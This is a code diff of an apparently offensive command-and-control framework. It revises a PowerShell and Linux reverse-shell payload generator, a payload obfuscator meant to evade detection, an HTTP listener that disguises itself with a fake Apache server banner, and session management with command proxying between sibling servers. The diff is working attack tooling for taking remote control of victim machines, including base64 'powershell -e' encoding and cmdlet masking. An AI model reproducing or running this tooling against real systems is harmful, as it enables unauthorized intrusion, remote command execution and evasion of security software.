@@ -23,35 +23,28 @@ from .settings import Threading_params, Core_server_settings, Sessions_manager_s
 
 filterwarnings("ignore", category = DeprecationWarning)
 
-# Check if both cert and key files were provided
-if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
-	exit_with_msg('SSL support seems to be misconfigured (missing key or cert file). Review settings.py file.')
-
-ssl_support = True if Hoaxshell_settings.certfile and Hoaxshell_settings.keyfile else False
-
-# ------------------ Settings ------------------ #
-# ~ prompt = "hoaxshell > "
-# ~ stop_event = Event()
-# ~ t_process = None
-
-
-# ~ def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
-
-	# ~ if Hoaxshell.rst_promt_required or force_rst:
-		# ~ sys.stdout.write(prefix + prompt + readline.get_line_buffer())
-		# ~ Hoaxshell.rst_promt_required = False
-
-
 
 class Payload_generator:
 
 
 	def __init__(self):
+		
 		self.obfuscator = Obfuscator()
+		
+		self.boolean_args = {
+			'encode' : False,
+			'obfuscate' : False,		
+			'constraint_mode' : False,
+			'trusted_domain' : False
+		}
+		
+		self.supported = {
+			'linux' : ['trusted_domain'],
+			'windows' : ['trusted_domain', 'encode', 'obfuscate', 'constraint_mode', 'exec_outfile']
+		}
 
 
-
-	def encodePayload(self, payload):
+	def encodeUTF16(self, payload):
 		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 		return enc_payload
 
@@ -63,222 +56,244 @@ class Payload_generator:
 			args_dict = {}
 			
 			for arg in args_list:
-				tmp = arg.split("=")
-				args_dict[tmp[0].lower()] = tmp[1]
+				
+				try:
+					tmp = arg.split("=")
+					args_dict[tmp[0].lower()] = tmp[1]
+					
+				except:
+					args_dict[tmp[0].lower()] = True
 			
 			return args_dict
 		
 		except:
 			return None
 	
+
+
+	def read_file(self, path):
+		
+		f = open(path, 'r')
+		content = f.read()
+		f.close()
+		return content
+
 	
 	
 	def generate_payload(self, args_list):
 		
-		# ~ try:
+		try:
 
-		args_dict = self.args_to_dict(args_list)
-		arguments = args_dict.keys()
-		
-		if not args_dict:
-			print('Error parsing arguments. Check your input and try again.')
-			return 1
-				
-		boolean_args = {
-			'raw' : False,
-			'obfuscate' : False,		
-			'constraint_mode' : False,
-			'trusted_domain' : False
-		}
-		
-		''' Parse OS '''
-		if 'os' in arguments:
-			if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
-				os_type = args_dict['os']
+			args_dict = self.args_to_dict(args_list)
+			arguments = args_dict.keys()
 			
+			if not args_dict:
+				print('Error parsing arguments. Check your input and try again.')
+				return
+					
+
+			
+			''' Parse OS '''
+			if 'os' in arguments:
+				if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
+					os_type = args_dict['os'].lower()
+				
+				else:
+					print('Unsupported OS type.')
+					return		
+				
 			else:
-				print('Unsupported OS type.')
-				return 1				
-			
-		else:
-			print('Required argument OS not provided.')
-			return 1	
-	
+				print('Required argument OS not provided.')
+				return
 		
-		''' Parse LHOST '''
-		if 'lhost' in arguments:
 			
-			try:
-				lhost = str(ip_address(args_dict['lhost']))
-				
-			except ValueError:
+			''' Parse LHOST '''
+			if 'lhost' in arguments:
 				
 				try:
-					lhost = ni.ifaddresses(args_dict['lhost'])[ni.AF_INET][0]['addr']
+					lhost = str(ip_address(args_dict['lhost']))
 					
-				except:
-					print('Error parsing LHOST. Check your input and try again.')
-					return 1
+				except ValueError:
 					
-		else:
-			print('Required argument LHOST not provided.')
-			return 1			
-		
-		
-
-		''' Parse FREQUENCY'''
-		if 'frequency' in arguments:
-			
-			if isinstance(args_dict['frequency'], float) or isinstance(args_dict['frequency'], int):
-				frequency = args_dict['frequency']
-				
+					try:
+						lhost = ni.ifaddresses(args_dict['lhost'])[ni.AF_INET][0]['addr']
+						
+					except:
+						print('Error parsing LHOST. Invalid IP or Interface.')
+						return
+						
 			else:
-				print('Error parsing FREQUENCY. Invalid type.')
-				return 1				
-				
-		else:	
-			frequency = Hoaxshell_settings.default_frequency
-		
-		
-		
-		''' Parse HEADER '''
-		if 'header' in arguments:
+				print('Required argument LHOST not provided.')
+				return	
 			
-			# Check provided header name for illegal chars	
-			valid = ascii_uppercase + ascii_lowercase + '-_'
 			
-			for char in args_dict['header']:
-				if char not in valid:
-					print(f'HEADER value includes illegal character "{char}".')
-					return 1
-			
-			Hoaxshell_settings._header = args_dict['header']
 
-
-
-		''' Parse EXEC_OUTFILE '''
-		support = ['windows']
-		
-		if args_dict['os'] in support:
-			
-			if (args_dict['os'] == 'windows') and ('exec_outfile' in arguments):
-				exec_outfile = args_dict['exec_outfile']
-				
-			else:
-				exec_outfile = False
-		else:
-			print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')
-
-
-
-		# ~ ''' Parse OBFUSCATE '''
-		# ~ support = ['windows']
-		# ~ obf_level = False
-		
-		# ~ if args_dict['os'] in support:
-			# ~ if 'obfuscate' in arguments:
+			# ~ ''' Parse FREQUENCY'''
+			# ~ if 'frequency' in arguments:
 				
 				# ~ try:
-					# ~ obf_level = int(args_dict['obfuscate'])
-					
+					# ~ frequency = float(args_dict['frequency'])
+				
 				# ~ except:
-					# ~ print('Error parsing OBFUSCATE. Invalid type.')
-					# ~ return 1
+					# ~ print('Error parsing FREQUENCY. Invalid type.')
+					# ~ return
+								
+				# ~ if frequency < 0.8:
+					# ~ print('Error parsing FREQUENCY. Value should be greater than or equal to 0.8')
+					# ~ return		
+					
+			# ~ else:	
+			frequency = Hoaxshell_settings.default_frequency
 			
-				# ~ if not ((obf_level >= 1) and (obf_level <=2)):
-					# ~ print('Obfuscate value can be between 1-2.')
-					# ~ return 1
+			
+			
+			# ~ ''' Parse HEADER '''
+			# ~ if 'header' in arguments:
+				
+				# ~ # Check provided header name for illegal chars	
+				# ~ valid = ascii_uppercase + ascii_lowercase + '-_'
+				
+				# ~ for char in args_dict['header']:
+					# ~ if char not in valid:
+						# ~ print(f'HEADER value includes illegal character "{char}".')
+						# ~ return 1
+				
+				# ~ Hoaxshell_settings._header = args_dict['header']
+
+
+
+			''' Parse EXEC_OUTFILE '''		
+			if 'exec_outfile' in arguments:
+				
+				if 'exec_outfile' in self.supported[args_dict['os']]:
+					exec_outfile = args_dict['exec_outfile']
+						
+				else:					
+					exec_outfile = False
+					print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')
+			else:
+				exec_outfile = False
+
+
+			# ~ ''' Parse OBFUSCATE '''
+			# ~ support = ['windows']
+			# ~ obf_level = False
+			
+			# ~ if args_dict['os'] in support:
+				# ~ if 'obfuscate' in arguments:
 					
-		# ~ else:
-			# ~ print(f'Ignoring argument "obfuscate" (not supported for {args_dict["os"]} payloads)')
-
-
-
-
-		''' Parse BOOLEAN '''
-		
-		for item in boolean_args.keys():
-			if (item in arguments) and (os_type == 'windows'):
-
-				if args_dict[item] == 'true':
-					boolean_args[item] = True
-					
-				elif args_dict[item] == 'false':
-					boolean_args[item] = False
-					
-				else:
-					print(f'Invalid value for {boolean_args[item]} (type: BOOLEAN).')
-					return 1
+					# ~ try:
+						# ~ obf_level = int(args_dict['obfuscate'])
+						
+					# ~ except:
+						# ~ print('Error parsing OBFUSCATE. Invalid type.')
+						# ~ return 1
+				
+					# ~ if not ((obf_level >= 1) and (obf_level <=2)):
+						# ~ print('Obfuscate value can be between 1-2.')
+						# ~ return 1
+						
 			# ~ else:
-				# ~ boolean_args[item] = False
-		# ~ else:
-			# ~ print(f'Ignoring argument "{item}" (not supported for linux payloads)')		
+				# ~ print(f'Ignoring argument "obfuscate" (not supported for {args_dict["os"]} payloads)')
 
 
-		''' Parse RAW '''	
-		if 'encode' in arguments:
-			encode = True if args_dict['encode'].lower() == 'true' else False
-		else:
-			encode = False
+
+
+			''' Parse BOOLEAN '''
 			
-		if (os_type == 'linux'):
-			boolean_args['constraint_mode'] = True
-			boolean_args['trusted_domain'] = True
-			exec_outfile = False
-			encode = False
+			for item in self.boolean_args.keys():
+				if item in arguments:
+					if item in self.supported[os_type]:
+						self.boolean_args[item] = True
+					
+						# ~ if args_dict[item] == 'true':
+							# ~ boolean_args[item] = True
+							
+						# ~ elif args_dict[item] == 'false':
+							# ~ boolean_args[item] = False
+							
+						# ~ else:
+							# ~ print(f'Invalid value for {boolean_args[item]} (type: BOOLEAN).')
+							# ~ return 1
+							
+					# ~ else:
+						# ~ boolean_args[item] = False
+					else:
+						print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
+				# ~ else:
+					# ~ print(f'Ignoring undefined argument "{item}".')
 
-		lhost = f'{lhost}:{Hoaxshell_settings.bind_port}'
-
-		# Create session unique id
-		verify = str(uuid4())[0:8]
-		get_cmd = str(uuid4())[0:8]
-		post_res = str(uuid4())[0:8]
-		hid = str(uuid4()).split("-")
-		header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
-		session_unique_id = '-'.join([verify, get_cmd, post_res])
-
-		print(f'Generating reverse shell payload...')
-								  
-		if not ssl_support:
-			source = open(f'{cwd}/payload_templates/{os_type}/http_payload', 'r') if not exec_outfile else open(f'{cwd}/payload_templates/{os_type}/http_payload_outfile', 'r')
-		
-		elif ssl_support and boolean_args['trusted_domain']:
-			source = open(f'{cwd}/payload_templates/{os_type}/https_payload_trusted', 'r') if not exec_outfile else open(f'{cwd}/payload_templates/{os_type}/https_payload_trusted_outfile', 'r')
+				
 			
-		elif ssl_support and not boolean_args['trusted_domain']:
-			source = open(f'{cwd}/payload_templates/{os_type}/https_payload', 'r') if not exec_outfile else open(f'{cwd}/payload_templates/{os_type}/https_payload_outfile', 'r')
-		
-		payload = source.read().strip()
-		source.close()
-		
-		payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
-			frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id)
-		
-		if exec_outfile:
-			payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
-		
-		if boolean_args['constraint_mode']:
-			payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
-		
-		Sessions_manager.legit_session_ids[session_unique_id] = {
-			'OS Type' : args_dict['os'].capitalize(),
-			'constraint_mode' : boolean_args['constraint_mode'],
-			'frequency' : frequency
-		}
-		
-		payload = self.obfuscator.mask_payload(payload) if boolean_args['obfuscate'] else payload
-		payload = self.encodePayload(payload) if encode else payload
-		
-		print(f'{PLOAD}{payload}{END}')
-		copy2cb(payload)
-		print(f'{ORANGE}Copied to clipboard!{END}')
-		# ~ except Exception as e:
-			# ~ print(f'ERROR + {str(e)}')
+			if (os_type == 'linux'):
+				self.boolean_args['constraint_mode'] = True
+				self.boolean_args['trusted_domain'] = True
+				# ~ exec_outfile = False
+				# ~ encode = False
+
+			lhost = f'{lhost}:{Hoaxshell_settings.bind_port}' if not Hoaxshell_settings.ssl_support else f'{lhost}:{Hoaxshell_settings.bind_port_ssl}'
+
+			# Create session unique id
+			verify = str(uuid4())[0:8]
+			get_cmd = str(uuid4())[0:8]
+			post_res = str(uuid4())[0:8]
+			hid = str(uuid4()).split("-")
+			header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
+			session_unique_id = '-'.join([verify, get_cmd, post_res])
+
+			print(f'Generating reverse shell payload...')
+									  
+			# Select base template
+			if Hoaxshell_settings.ssl_support:
+				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload') if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload_outfile')
+									  
+			else:
+				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/http_payload') if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/http_payload_outfile')
+			
+
+			# Append basic parameters		
+			payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
+				frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()
+			
+			
+			# Customize template 
+			if exec_outfile:
+				payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
+			
+			if self.boolean_args['constraint_mode']:
+				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
+
+			if not self.boolean_args['trusted_domain'] and Hoaxshell_settings.ssl_support:
+				disable_ssl_chk = self.read_file(f'{cwd}/payload_templates/{os_type}/disable_ssl_check')
+				payload = f'{disable_ssl_chk}{payload}'.strip()
+			
+			Sessions_manager.legit_session_ids[session_unique_id] = {
+				'OS Type' : args_dict['os'].capitalize(),
+				'constraint_mode' : self.boolean_args['constraint_mode'],
+				'frequency' : frequency
+			}
+			
+			payload = self.obfuscator.mask_payload(payload) if self.boolean_args['obfuscate'] else payload
+			payload = self.encodeUTF16(payload) if self.boolean_args['encode'] else payload
+			
+			print(f'{PLOAD}{payload}{END}')
+			copy2cb(payload)
+			print(f'{ORANGE}Copied to clipboard!{END}')
+			
+		except:
+			print('Error parsing arguments. Check your input and try again.')
+			return
 
 
 
 class Obfuscator:
-
+	
+	def __init__(self):
+		
+		self.restricted_var_names = ['t', 'tr', 'tru', 'true', 'e', 'en', 'env']
+		self.used_var_names = []
+	
+	
 	def mask_char(self, char):
 		
 		path = randint(1,3)
@@ -430,10 +445,11 @@ class Obfuscator:
 			
 			obf = str(uuid4())[0:_max]
 			
-			if obf in ['t', 'tr', 'tru', 'true']:
+			if (obf in self.restricted_var_names) or (obf in self.used_var_names):
 				continue
 				
 			else:
+				self.used_var_names.append(obf)
 				legal = True
 		
 		return obf
@@ -442,7 +458,7 @@ class Obfuscator:
 
 	def mask_payload(self, payload):
 		
-		# Obfuscate variable definition names
+		# Obfuscate variable name definitions
 		variables = re.findall("\$[A-Za-z0-9_]*={1}", payload)
 		
 		if variables:
@@ -522,7 +538,7 @@ class Obfuscator:
 
 
 		# Randomize char case of specified components
-		components = ['Out-String', 'Invoke-WebRequest', 'iwr', 'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', 'Invoke-RestMethod', 'irm']
+		components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', 'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', 'Invoke-RestMethod', 'irm']
 	
 		for i in range(0, len(components)):
 			rand_case = self.randomize_case(components[i])
@@ -532,10 +548,11 @@ class Obfuscator:
 		
 		# Obfuscate cmdlets
 		for i in range(0, len(components)):
-			if (components[i].count('.') == 0) and components[i] not in ['while']:
+			if (components[i].count('.') == 0) and components[i].lower() not in ['while', 'username', 'computername']:
 				obf_cmdlet = self.obfuscate_cmdlet(components[i])
 				payload = payload.replace(components[i], obf_cmdlet)
 		
+		self.used_var_names = []
 		return payload
 		
 
@@ -558,7 +575,7 @@ class Sessions_manager:
 				# ~ print(f'{session_id}  {self.active_sessions[session]["ip"]}  {self.active_sessions[session]["OS Type"]}  {self.active_sessions[session]["Owner"]}  {self.active_sessions[session]["Status"]}')
 
 			table = self.sessions_dict_to_list()
-			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'Owner', 'Status'])
+			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])
 			
 			print('\r')
 		
@@ -574,8 +591,9 @@ class Sessions_manager:
 		for session_id in self.active_sessions.keys():
 			
 			tmp = self.active_sessions[session_id].copy()
-			tmp['Session ID'] = session_id
+			tmp['Session ID'] = session_id if not tmp['aliased'] else tmp['alias']
 			tmp['Owner'] = 'Self' if tmp['self_owned'] else Core_server.sibling_servers[tmp['Owner']]['Hostname']
+			tmp['User'] = f"{tmp['Computername']}\\{tmp['Username']}" if tmp['OS Type'] == 'Windows' else f"{tmp['Username']}@{tmp['Computername']}"
 			sessions_list.append(tmp)
 		
 		return sessions_list
@@ -592,14 +610,14 @@ class Sessions_manager:
 			
 
 	@staticmethod
-	def alias_to_session_id(sid):
+	def alias_to_session_id(alias):
 		
 		for session_id in Sessions_manager.active_sessions.keys():
 			if Sessions_manager.active_sessions[session_id]['aliased']:
-				if Sessions_manager.active_sessions[session_id]['alias'] == sid:
+				if Sessions_manager.active_sessions[session_id]['alias'] == alias:
 					return session_id
 		
-		return sid
+		return alias
 
 
 
@@ -630,13 +648,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	verify = []
 	get_cmd = []
 	post_res = []
-	server_version = 'Apache/2.4.1' #if not server_version else server_version
 	
 	# Shell 
 	active_shell = None
 	prompt_ready = True
 	init_dir = None
-	# ~ shell_prompt = None
 	
 
 
@@ -672,8 +688,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	
 	def cmd_output_interpreter(self, output, constraint_mode = False):
-		
-		# ~ global prompt
 		
 		try:
 				
@@ -754,13 +768,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		try:
 			
 			while Hoaxshell.active_shell:
-				# ~ print(Hoaxshell.prompt_ready)
+				
 				if Hoaxshell.prompt_ready:
-					# ~ print('shell ready')
+					
 					user_input = input(prompt).strip()					
 					
 					if user_input.lower() in ['clear']:
-						system('clear')
+						os.system('clear')
 
 					elif user_input.lower() in ['exit', 'quit', 'q']:
 						raise KeyboardInterrupt
@@ -775,14 +789,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							Hoaxshell.prompt_ready = False
 							
 							if is_remote_shell:
-							# ~ if user_input == "pwd":  #delete
-								# ~ user_input = "split-path $pwd'\\0x00'" #delete
-								# ~ command = command + ";pwd" + ";echo '{" + core.SERVER_UNIQUE_ID + "}'"
 								command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
 								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
 								
 							else:	
-								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input + f";pwd")
+								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
 							# ~ Hoaxshell.prompt_ready = False
 
 
@@ -825,21 +836,17 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		timestamp = int(datetime.now().timestamp())		
 
 		# Identify session
-		# ~ try:
+		
 		if not Hoaxshell.header_id:
 			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
 			Hoaxshell.header_id = f'X-{header_id_extract[0]}'
-		# ~ else:
-			# ~ _header = _header
+
 		try:
 			session_id = self.headers.get(Hoaxshell.header_id)
+			
 		except:
 			session_id = None
-			
-		# ~ except:
-			# ~ print('BOOM')
-			# ~ pass
-		
+				
 		
 		#if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
 		if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
@@ -871,9 +878,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				
 		
 		elif not session_id:
-			print('ommited') #delete
 			return
-		# ~ self.server_version = Hoaxshell.server_version
+			
+			
+		self.server_version = Hoaxshell_settings.server_version
 		self.sys_version = ""
 		session_id = self.headers.get(Hoaxshell.header_id)
 		legit = True if session_id in Sessions_manager.legit_session_ids.keys() else False
@@ -884,7 +892,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		if url_split[0] in Hoaxshell.verify and legit:
 			
 			if Sessions_manager.active_sessions[session_id]['execution_verified']:
-				print('received request from already established session') #delete
+				print('\rReceived "Verify execution" request from an already established session (ignored).')
+				Main_prompt.rst_prompt(force_rst = True)
 				return
 			
 			self.send_response(200)
@@ -950,11 +959,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		if legit:		
 				
 			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
-			self.server_version = self.server_version
+			self.server_version = Hoaxshell_settings.server_version
 			self.sys_version = ""				
 
 			# cmd output
-			if self.path.strip("/") in self.post_res:
+			if self.path.strip("/") in self.post_res and legit:
 
 				try:
 					self.send_response(200)
@@ -1001,13 +1010,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	def do_OPTIONS(self):
 
-		self.server_version = Hoaxshell.server_version
+		self.server_version = Hoaxshell_settings.server_version
 		self.sys_version = ""
 		self.send_response(200)
 		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
 		self.send_header('Vary', "Origin")
 		self.send_header('Access-Control-Allow-Credentials', 'true')
-		self.send_header('Access-Control-Allow-Headers', Hoaxshell.header_id)
+		self.send_header('Access-Control-Allow-Headers', Hoaxshell_settings.header_id)
 		self.end_headers()
 		self.wfile.write(b'OK')
 
@@ -1084,22 +1093,28 @@ class Hoaxshell(BaseHTTPRequestHandler):
 def initiate_hoax_server():
 
 	try:
-					
+
+		# Check if both cert and key files were provided
+		if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
+			exit_with_msg('SSL support seems to be misconfigured (missing key or cert file).')
+
 		# Start http server
+		port = Hoaxshell_settings.bind_port if not Hoaxshell_settings.ssl_support else Hoaxshell_settings.bind_port_ssl
+		
 		try:
-			httpd = HTTPServer((Hoaxshell_settings.bind_address, Hoaxshell_settings.bind_port), Hoaxshell)
+			httpd = HTTPServer((Hoaxshell_settings.bind_address, port), Hoaxshell)
 
 		except OSError:
-			exit(f'[{FAILED}] {BOLD}Port {Hoaxshell_settings.bind_port} seems to already be in use.{END}\n')
+			exit(f'[{FAILED}] {BOLD}Port {port} seems to already be in use.{END}\n')
 		
 		except:
 			exit(f'\n[{FAILED}] HTTP server failed to start (Unknown error occurred).\n')
 
-		if ssl_support:
+		if Hoaxshell_settings.ssl_support:
 			httpd.socket = ssl.wrap_socket (
 				httpd.socket,
-				keyfile = keyfile ,
-				certfile = certfile ,
+				keyfile = Hoaxshell_settings.keyfile,
+				certfile = Hoaxshell_settings.certfile,
 				server_side = True,
 				ssl_version=ssl.PROTOCOL_TLS
 			)
@@ -1108,12 +1123,11 @@ def initiate_hoax_server():
 		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
 		Hoaxshell_server.daemon = True
 		Hoaxshell_server.start()
-		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{Hoaxshell_settings.bind_address}{END}:{ORANGE}{Hoaxshell_settings.bind_port}{END}\n')
+		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{Hoaxshell_settings.bind_address}{END}:{ORANGE}{port}{END}\n')
 
 	
 	except KeyboardInterrupt:
 		Hoaxshell.terminate()
-
 
 
 
@@ -1235,12 +1249,8 @@ class Core_server:
 						data = decrypted_data[1]
 						
 						# Check if session exists
-						if data['session_id'] in Sessions_manager.active_sessions.keys():
-							
-							if data['command'] == "pwd": 
-								data['command'] = "split-path $pwd'\\0x00'"	
-													
-							Hoaxshell.command_pool[data['session_id']].append(data['command'] + ";pwd")
+						if data['session_id'] in Sessions_manager.active_sessions.keys():																			
+							Hoaxshell.command_pool[data['session_id']].append(data['command'])
 							conn.send(self.response_ack(sibling_id))
 							
 							
@@ -1265,8 +1275,7 @@ class Core_server:
 						
 						new_session_id = decrypted_data[1]['session_id']
 						decrypted_data[1].pop('session_id', None)
-						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]
-							
+						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
 						print(f'\r[{GREEN}Shell{END}] {BOLD}New session established! {END}[{ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END}] (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
 						Main_prompt.rst_prompt(force_rst = True)
 						del decrypted_data, new_session_id
@@ -1655,7 +1664,8 @@ class Core_server:
 		
 		# Check again if server in siblings
 		if not sibling_id in Core_server.sibling_servers.keys():
-			print('\rServer not in siblings.')
+			print('\rFailed to proxy the command. Connection with the sibling server may be lost.')
+			Main_prompt.rst_prompt(force_rst = True)
 			return
 		
 		# Send command to sibling
